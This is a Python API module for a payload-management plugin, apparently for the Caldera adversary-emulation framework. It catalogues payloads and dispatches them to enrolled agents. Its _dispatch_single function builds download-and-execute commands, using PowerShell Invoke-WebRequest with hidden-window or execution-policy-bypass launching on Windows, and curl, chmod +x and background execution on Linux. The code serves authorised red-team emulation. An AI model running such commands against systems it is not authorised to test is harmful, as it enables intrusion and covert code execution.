import json
from aiohttp import web
import aiohttp
import io
import csv
import yaml
import os
from app.utility.base_world import BaseWorld
from app.service.auth_svc import for_all_public_methods, check_authorization

from .service import PayloadsService


@for_all_public_methods(check_authorization)
class PayloadsAPI:
    def __init__(self, services):
        self._services = services
        self._svc = PayloadsService(services)
        # load initial data (manifest directory)
        self._services.loop.create_task(self._svc.load_from_disk('plugins/payloads/data/manifest'))

    async def list_payloads(self, request: web.Request) -> web.Response:
        params = request.rel_url.query
        page = int(params.get('page', '1'))
        page_size = int(params.get('page_size', '20'))
        query = dict(
            search=params.get('search', ''),
            tactics=params.getall('tactics', []),
            os=params.getall('os', []),
            file_types=params.getall('file_types', []),
            tags=params.getall('tags', []),
            status=params.getall('status', []),
            severity=params.getall('severity', []),
            page=page,
            page_size=page_size,
            sort=params.get('sort', 'updated_at:desc')
        )
        return web.json_response(self._svc.list_payloads(query))

    async def get_facets(self, request: web.Request) -> web.Response:
        params = request.rel_url.query
        query = dict(search=params.get('search', ''))
        return web.json_response(self._svc.facets(query))

    async def get_payload_detail(self, request: web.Request) -> web.Response:
        pid = request.match_info.get('pid')
        item = self._svc._payloads.get(pid)
        if not item:
            return web.json_response(dict(error='not found', id=pid), status=404)
        return web.json_response(item)

    async def import_payloads(self, request: web.Request) -> web.Response:
        if request.content_type.startswith('multipart/'):
            reader = await request.multipart()
            yaml_part = None
            async for part in reader:
                if part.name == 'yaml_file':
                    data = await part.read(decode=False)
                    yaml_part = data
                    break
            if not yaml_part:
                return web.json_response(dict(error='yaml_file missing'), status=400)
            result = await self._svc.handle_yaml_import(yaml_part)
            return web.json_response(result)
        else:
            data = await request.read()
            result = await self._svc.handle_yaml_import(data)
            return web.json_response(result)

    async def upload_file(self, request: web.Request) -> web.Response:
        if not request.content_type.startswith('multipart/'):
            return web.json_response(dict(error='multipart/form-data required'), status=400)
        reader = await request.multipart()
        async for part in reader:
            if part.name == 'file':
                info = await self._svc.save_uploaded_file(part)
                return web.json_response(info)
        return web.json_response(dict(error='file field missing'), status=400)

    async def export_payloads(self, request: web.Request) -> web.Response:
        params = request.rel_url.query
        fmt = params.get('format', 'yaml').lower()
        ids = params.getall('ids', [])
        if ids:
            items = [self._svc._payloads[i] for i in ids if i in self._svc._payloads]
        else:
            query = dict(
                search=params.get('search', ''),
                tactics=params.getall('tactics', []),
                os=params.getall('os', []),
                file_types=params.getall('file_types', []),
                tags=params.getall('tags', []),
                status=params.getall('status', []),
                severity=params.getall('severity', []),
                page=1,
                page_size=10_000,
                sort=params.get('sort', 'updated_at:desc')
            )
            data = self._svc.list_payloads(query)
            items = data.get('items', [])
        if fmt == 'csv':
            output = io.StringIO()
            fieldnames = ['id','name','md5','file_type','os','tactics','severity','status','updated_at','tags']
            writer = csv.DictWriter(output, fieldnames=fieldnames)
            writer.writeheader()
            for it in items:
                writer.writerow({
                    'id': it.get('id',''),
                    'name': it.get('name',''),
                    'md5': it.get('md5',''),
                    'file_type': it.get('file_type',''),
                    'os': ','.join(it.get('os') or []),
                    'tactics': ','.join([str(x) for x in (it.get('tactics') or [])]),
                    'severity': it.get('severity',''),
                    'status': it.get('status',''),
                    'updated_at': it.get('updated_at',''),
                    'tags': ','.join(it.get('tags') or []),
                })
            resp = web.Response(text=output.getvalue())
            resp.content_type = 'text/csv'
            resp.headers['Content-Disposition'] = 'attachment; filename="payloads.csv"'
            return resp
        else:
            content = yaml.safe_dump({'items': items}, sort_keys=False, allow_unicode=True)
            resp = web.Response(text=content)
            resp.content_type = 'application/x-yaml'
            resp.headers['Content-Disposition'] = 'attachment; filename="payloads.yml"'
            return resp

    async def batch_actions(self, request: web.Request) -> web.Response:
        body = await request.json()
        action = body.get('action')
        ids = set(body.get('ids') or [])
        targets = body.get('targets') or {}
        affected = 0
        errors = []
        if action in ('disable','enable'):
            new_status = 'disabled' if action == 'disable' else 'active'
            for pid in ids:
                item = self._svc._payloads.get(pid)
                if item:
                    item['status'] = new_status
                    affected += 1
                else:
                    errors.append({'id': pid, 'reason': 'not found'})
            return web.json_response({'affected': affected, 'errors': errors})
        elif action == 'delete':
            for pid in ids:
                if pid in self._svc._payloads:
                    del self._svc._payloads[pid]
                    affected += 1
                else:
                    errors.append({'id': pid, 'reason': 'not found'})
            return web.json_response({'affected': affected, 'errors': errors})
        elif action == 'dispatch':
            # batch dispatch each id
            results = []
            for pid in ids:
                data = dict(id=pid, args=body.get('args') or {}, targets=targets, mode=body.get('mode') or 'dispatch_to_agents')
                resp = await self.dispatch(request.clone(rel_url=request.rel_url)) if False else await self._dispatch_single(request, data)
                results.append(dict(id=pid, **resp))
            return web.json_response({'results': results})
        else:
            return web.json_response({'error': 'unsupported action'}, status=400)

    async def _dispatch_single(self, request: web.Request, payload: dict) -> dict:
        pid = payload.get('id')
        args = payload.get('args') or {}
        targets = payload.get('targets') or {}
        agent_ids = targets.get('agent_ids') or []
        item = self._svc._payloads.get(pid)
        if not item:
            return {'error': 'not found'}
        # Build download URL
        if item.get('source') == 'url':
            download_url = item.get('download_url')
        else:
            base = str(request.url.with_path('/')).rstrip('/')
            download_url = f"{base}/plugin/payloads/{pid}/download"
        file_type = (item.get('file_type') or '').lower()
        def build_command(platform: str) -> str:
            if platform == 'windows':
                out = f"$p=$env:TEMP+'\\\\{pid}';"
                out += f"Invoke-WebRequest -UseBasicParsing -Uri '{download_url}' -OutFile $p;"
                if file_type in ['exe']:
                    out += "Start-Process -FilePath $p -WindowStyle Hidden;"
                elif file_type in ['ps1']:
                    out += "powershell -ExecutionPolicy Bypass -File $p;"
                elif file_type in ['py']:
                    out += "python $p;"
                else:
                    out += "Write-Host 'Downloaded payload';"
                return out
            else:
                out = f"p=/tmp/{pid}; curl -fsSL '{download_url}' -o $p; chmod +x $p; "
                if file_type in ['sh']:
                    out += "bash $p;"
                elif file_type in ['py']:
                    out += "python3 $p;"
                else:
                    out += "$p &"
                return out
        rest_svc = self._services.get('rest_svc')
        access = dict(access=[BaseWorld.Access.RED])
        op_req = dict(name=f"payload-{pid}", group='custom', agent_ids=agent_ids)
        ops = await rest_svc.create_operation(access, op_req)
        operation_id = ops[0].get('id') if isinstance(ops, list) else None
        if not operation_id:
            return {'error': 'failed to create operation'}
        results = []
        for paw in agent_ids:
            agents = await self._services.get('data_svc').locate('agents', match=dict(paw=paw))
            if not agents:
                results.append({'paw': paw, 'error': 'agent not found'})
                continue
            agent = agents[0]
            platform = getattr(agent, 'platform', 'linux')
            cmd = build_command(platform)
            exec_name = 'powershell' if platform == 'windows' else 'bash'
            if exec_name not in agent.executors:
                exec_name = agent.executors[0] if agent.executors else exec_name
            payload_req = dict(operation=operation_id, agent=paw, executor=exec_name, command=cmd)
            res = await rest_svc.add_manual_command(access, payload_req)
            results.append({'paw': paw, 'link': res.get('link') if isinstance(res, dict) else None})
        return {'operation_id': operation_id, 'results': results}

    async def list_agents(self, request: web.Request) -> web.Response:
        params = request.rel_url.query
        search = params.get('search','').lower().strip()
        online_only = params.get('online_only','false').lower() == 'true'
        page = int(params.get('page','1'))
        page_size = int(params.get('page_size','20'))
        data_svc = self._services.get('data_svc')
        agents = await data_svc.locate('agents')
        filtered = []
        for a in agents:
            name = getattr(a, 'host', '') or ''
            paw = getattr(a, 'paw', '') or ''
            if search and (search not in name.lower() and search not in paw.lower()):
                continue
            if online_only and getattr(a, 'watchdog', 0) == 0:
                continue
            filtered.append({'paw': paw, 'host': name, 'platform': getattr(a, 'platform',''), 'executors': a.executors})
        total = len(filtered)
        start = (page-1)*page_size
        end = start + page_size
        return web.json_response({'items': filtered[start:end], 'total': total, 'page': page, 'page_size': page_size})

    async def download_payload(self, request: web.Request) -> web.StreamResponse:
        pid = request.match_info.get('pid')
        item = self._svc._payloads.get(pid)
        if not item:
            return web.json_response({'error': 'not found'}, status=404)
        source = item.get('source')
        file_svc = self._services.get('file_svc')
        if source == 'local':
            path = item.get('source_path')
            _, file_path = await file_svc.find_file_path(path, location='')
            if not file_path:
                return web.json_response({'error': 'file not found'}, status=404)
            data = file_svc.read_file(file_path)
            resp = web.Response(body=data)
            resp.content_type = 'application/octet-stream'
            resp.headers['Content-Disposition'] = f'attachment; filename="{path.split(os.sep)[-1]}"'
            return resp
        elif source == 'url':
            url = item.get('download_url')
            timeout = aiohttp.ClientTimeout(total=60)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as r:
                    if r.status != 200:
                        return web.json_response({'error': 'download failed'}, status=502)
                    data = await r.read()
            resp = web.Response(body=data)
            resp.content_type = 'application/octet-stream'
            resp.headers['Content-Disposition'] = 'attachment; filename="payload.bin"'
            return resp
        return web.json_response({'error': 'unsupported source'}, status=400)

    async def dispatch(self, request: web.Request) -> web.Response:
        body = await request.json()
        resp = await self._dispatch_single(request, body)
        if 'error' in resp:
            return web.json_response(resp, status=400 if resp['error']=='not found' else 500)
        return web.json_response(resp)

    async def history(self, request: web.Request) -> web.Response:
        # Return recent operations started by this plugin (name startswith 'payload-')
        data_svc = self._services.get('data_svc')
        ops = await data_svc.locate('operations')
        items = []
        for op in ops[-200:]:
            if getattr(op, 'name', '').startswith('payload-'):
                items.append({'id': op.id, 'name': op.name, 'state': op.state, 'created': getattr(op, 'start', None)})
        items = list(reversed(items))
        return web.json_response({'items': items})


